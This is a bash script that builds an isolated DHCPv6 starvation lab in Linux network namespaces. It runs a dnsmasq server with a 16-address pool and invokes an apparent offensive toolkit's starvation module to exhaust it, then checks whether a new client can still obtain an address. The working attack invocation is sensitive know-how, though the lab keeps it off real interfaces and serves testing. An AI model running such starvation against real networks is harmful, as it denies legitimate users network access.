#!/usr/bin/env bash
# Isolated DHCPv6 starvation lab (Linux only, needs root).
#
# Topology: one bridge (the LAN) with three hosts attached:
#
#   server:   dnsmasq, the legitimate DHCPv6 server (2001:db8::1/64). Its pool is small:
#             2001:db8::100-10f, 16 addresses.
#   attacker: MACabre's DHCPv6 starvation. It sends SOLICIT messages from random client
#             identities and answers each ADVERTISE with a REQUEST, which creates a binding.
#   client:   a DHCPv6 client that runs SOLICIT, ADVERTISE, REQUEST and REPLY, and reports
#             the address it received, if any.
#
#   Phase 1 (baseline): one legitimate client gets an address from the pool.
#   Phase 2 (attack): the attacker runs for ATTACK_SECONDS. Then a new legitimate client
#            tries to get an address. The lab counts the rounds in which it got none.
#
# The lab counts the leases in the server's lease file before and after the attack. The
# pool size is set by the lab, not by any vendor, so this shows the mechanism only.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/dhcpv6_starvation_lab.sh
#   sudo ATTACK_SECONDS=40 ROUNDS=5 scripts/lab/dhcpv6_starvation_lab.sh
#
# Requirements: iproute2, dnsmasq, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip dnsmasq; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
ROUNDS="${ROUNDS:-3}"
ATTACK_SECONDS="${ATTACK_SECONDS:-20}"
ATTACK_SEED="${ATTACK_SEED:-4242}"
SEEDED_IDENTITIES="${SEEDED_IDENTITIES:-64}"
LEGIT_MAC="02:00:00:00:00:10"
CLIENT_MAC="02:00:00:00:00:50"
NEWCOMER_MAC="02:00:00:00:00:51"
WORK="$(mktemp -d)"
LOG="$WORK/dnsmasq.log"

stop_lab() {
    for pid in $(ip netns pids server 2>/dev/null || true); do
        kill "$pid" 2>/dev/null || true
    done
    for ns in client attacker server lan; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add lan
ip netns add server
ip netns add attacker
ip netns add client

# Each host has a veth to a port of the LAN bridge.
for pair in "srv:server" "att:attacker" "cli:client"; do
    name="${pair%%:*}"
    ns="${pair##*:}"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
done

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up
for name in srv att cli; do
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
done

ip netns exec server ip link set h-srv address "$LEGIT_MAC"
ip netns exec server ip link set h-srv up
ip netns exec server ip -6 addr add 2001:db8::1/64 dev h-srv nodad
ip netns exec attacker ip link set h-att up
ip netns exec client ip link set h-cli up
sleep 3

ip netns exec server dnsmasq \
    --keep-in-foreground \
    --interface=h-srv \
    --bind-interfaces \
    --port=0 \
    --conf-file=/dev/null \
    --dhcp-range=2001:db8::100,2001:db8::10f,64,12h \
    --dhcp-leasefile="$WORK/leases6" \
    --log-dhcp \
    --log-facility="$LOG" &
sleep 2

# dnsmasq looks up the MAC of an IPv6 client in the server's neighbour table. A host on a real
# link has one from its neighbour discovery traffic; the lab adds it for its two legitimate
# clients, so the server can answer them. The link-local addresses are the EUI-64 ones.
ip netns exec server ip -6 neigh replace fe80::ff:fe00:50 lladdr "$CLIENT_MAC" dev h-srv nud permanent
ip netns exec server ip -6 neigh replace fe80::ff:fe00:51 lladdr "$NEWCOMER_MAC" dev h-srv nud permanent

# The starvation module draws its client identities from a seeded generator, so the lab can
# replay the same MAC sequence and give the server a neighbour entry for each identity.
SEED_CODE='
import os, random
from macabre.attacks.common import random_mac
from macabre.attacks.dhcpv6_starvation import link_local_from_mac
rng = random.Random(int(os.environ["ATTACK_SEED"]))
for _ in range(int(os.environ["SEEDED_IDENTITIES"])):
    mac = random_mac(rng)
    rng.getrandbits(24)
    rng.getrandbits(32)
    print(link_local_from_mac(mac), mac)
'

# The lab seeds the server's neighbour table before the attack, as a host on the link would.
seed_identities() {
    local ll mac
    while read -r ll mac; do
        ip netns exec server ip -6 neigh replace "$ll" lladdr "$mac" dev h-srv nud permanent
    done < <(ATTACK_SEED="$ATTACK_SEED" SEEDED_IDENTITIES="$SEEDED_IDENTITIES" PYTHONPATH="$ROOT/src" "$PY" -c "$SEED_CODE")
}

ATTACK_CODE='
import os, random, threading
from macabre.attacks.dhcpv6_starvation import Dhcpv6StarvationConfig, run_dhcpv6_starvation
stop = threading.Event()
threading.Timer(float(os.environ["ATTACK_SECONDS"]), stop.set).start()
config = Dhcpv6StarvationConfig(iface="h-att", interval=0.02, request=True)
rng = random.Random(int(os.environ["ATTACK_SEED"]))
stats = run_dhcpv6_starvation(config, stop, lambda _: None, rng=rng)
print(f"Attacker: sent {stats.solicits} solicits, {stats.advertises} advertises, {stats.requests} requests")
'

# A client that runs one full exchange per round and reports the address it received.
CLIENT_CODE='
import os, random, time
from scapy.all import AsyncSniffer, sendp
from scapy.layers.dhcp6 import DHCP6_Advertise, DHCP6_Reply, DHCP6OptIAAddress
from macabre.attacks.dhcpv6_starvation import build_solicit, build_request, parse_advertise

MAC = os.environ["CLIENT_MAC"]
ROUNDS = int(os.environ["ROUNDS"])
rng = random.Random()
seen = []

def on_packet(pkt):
    if pkt.haslayer(DHCP6_Advertise) or pkt.haslayer(DHCP6_Reply):
        seen.append(pkt)

sniffer = AsyncSniffer(iface="h-cli", store=False, prn=on_packet)
sniffer.start()
time.sleep(0.5)
got = 0
for n in range(1, ROUNDS + 1):
    trid = rng.getrandbits(24)
    seen.clear()
    sendp(build_solicit(MAC, trid, 1), iface="h-cli", verbose=False)
    time.sleep(1.0)
    adverts = [p for p in seen if p.haslayer(DHCP6_Advertise) and p[DHCP6_Advertise].trid == trid]
    adv = parse_advertise(adverts[0]) if adverts else None
    if adv is None:
        advs = sum(1 for p in seen if p.haslayer(DHCP6_Advertise))
        print(f"round {n}: no address (advertise packets seen {advs})")
        continue
    seen.clear()
    sendp(build_request(MAC, trid, adv.iaid, adv.server_mac, adv.offered, server_duid=adv.server_duid), iface="h-cli", verbose=False)
    time.sleep(1.0)
    replies = [p for p in seen if p.haslayer(DHCP6_Reply) and p[DHCP6_Reply].trid == trid]
    if replies and replies[0].haslayer(DHCP6OptIAAddress):
        addr = replies[0][DHCP6OptIAAddress].addr
        got += 1
        print(f"round {n}: address {addr} from {adv.server_mac}")
    else:
        reps = sum(1 for p in seen if p.haslayer(DHCP6_Reply))
        print(f"round {n}: no address (reply packets seen {reps})")
sniffer.stop()
print(f"Client: got an address in {got} of {ROUNDS} rounds")
'

run_client() {
    ip netns exec client env PYTHONPATH="$ROOT/src" CLIENT_MAC="$1" ROUNDS="$ROUNDS" "$PY" -c "$CLIENT_CODE"
}

lease_count() {
    grep -c . "$WORK/leases6" 2>/dev/null || echo 0
}

echo "Phase 1: baseline, one legitimate client ($ROUNDS rounds)"
run_client "$CLIENT_MAC" | tee "$WORK/baseline.txt"
echo "  leases in the server's file: $(lease_count)"
echo

echo "Phase 2: attacker runs for ${ATTACK_SECONDS}s, then a new client tries ($ROUNDS rounds)"
LEASES_BEFORE="$(lease_count)"
seed_identities
ip netns exec attacker env PYTHONPATH="$ROOT/src" ATTACK_SECONDS="$ATTACK_SECONDS" ATTACK_SEED="$ATTACK_SEED" "$PY" -c "$ATTACK_CODE" | tee "$WORK/attack.txt"
LEASES_AFTER="$(lease_count)"
echo "  leases in the server's file: before $LEASES_BEFORE, after $LEASES_AFTER"
run_client "$NEWCOMER_MAC" | tee "$WORK/newcomer.txt"
echo

BASE_OK="$(grep -c 'address 2001:db8::' "$WORK/baseline.txt" || true)"
NEW_OK="$(grep -c 'address 2001:db8::' "$WORK/newcomer.txt" || true)"

if (( BASE_OK > 0 )); then
    echo "Baseline: the legitimate client got an address from the pool. OK"
    if (( LEASES_AFTER <= LEASES_BEFORE )); then
        echo "Starvation: not reproduced. The attack created no bindings (leases before $LEASES_BEFORE, after $LEASES_AFTER), so the pool was never used up. The new client's result says nothing about starvation."
    elif (( NEW_OK == 0 )); then
        echo "Starvation: the attack created bindings (leases before $LEASES_BEFORE, after $LEASES_AFTER) and the new client got no address in $ROUNDS of $ROUNDS rounds. Vulnerable."
    else
        echo "Starvation: the new client still got an address in $NEW_OK of $ROUNDS rounds. Not reproduced with this pool and duration."
    fi
else
    echo "Baseline: the legitimate client got no address. Starvation not evaluated: result unreliable."
    echo "Last lines of the server log:"
    tail -n 20 "$LOG" || true
fi
